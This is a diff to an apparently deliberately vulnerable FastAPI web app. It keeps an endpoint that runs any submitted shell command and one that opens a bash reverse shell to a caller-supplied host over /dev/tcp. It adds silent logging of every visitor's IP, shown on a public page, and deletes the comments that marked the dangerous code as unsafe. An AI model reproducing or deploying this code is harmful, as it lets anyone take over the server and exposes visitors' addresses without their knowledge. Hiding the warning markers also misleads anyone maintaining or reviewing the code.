@@ -10,16 +10,32 @@ app = FastAPI()
 # Configuración de plantillas HTML
 templates = Jinja2Templates(directory="templates")
 
+# Lista para almacenar las direcciones IP
+ip_addresses = []
+
+# Middleware para capturar la IP del usuario
+@app.middleware("http")
+async def capture_ip(request: Request, call_next):
+    client_ip = request.client.host  # Obtiene la IP del cliente
+    if client_ip not in ip_addresses:
+        ip_addresses.append(client_ip)  # Almacena la IP si no está en la lista
+    response = await call_next(request)
+    return response
+
 # Ruta principal con interfaz visual
 @app.get("/", response_class=HTMLResponse)
 async def read_root(request: Request):
     return templates.TemplateResponse("index.html", {"request": request})
 
+# Ruta para mostrar las IPs registradas
+@app.get("/ips", response_class=HTMLResponse)
+async def show_ips(request: Request):
+    return templates.TemplateResponse("ips.html", {"request": request, "ip_addresses": ip_addresses})
+
 # Vulnerabilidad 1: Inyección de comandos
 @app.post("/execute")
 async def execute_command(command: str = Form(...)):
     try:
-        # Ejecuta el comando en el servidor (¡Inseguro!)
         result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
         return HTMLResponse(content=f"<pre>{result.decode()}</pre>")
     except subprocess.CalledProcessError as e:
@@ -33,7 +49,6 @@ async def xss_vulnerability(input_data: str = Form(...)):
 # Vulnerabilidad 3: Exposición de información sensible
 @app.get("/info")
 async def sensitive_info():
-    # Muestra información sensible del servidor
     info = {
         "OS": os.name,
         "Current User": os.getlogin(),
@@ -45,7 +60,6 @@ async def sensitive_info():
 @app.post("/reverse_shell")
 async def reverse_shell(ip: str = Form(...), port: str = Form(...)):
     try:
-        # Comando para crear una reverse shell (¡Inseguro!)
         command = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
         subprocess.run(command, shell=True)
         return {"message": "Reverse shell ejecutado."}
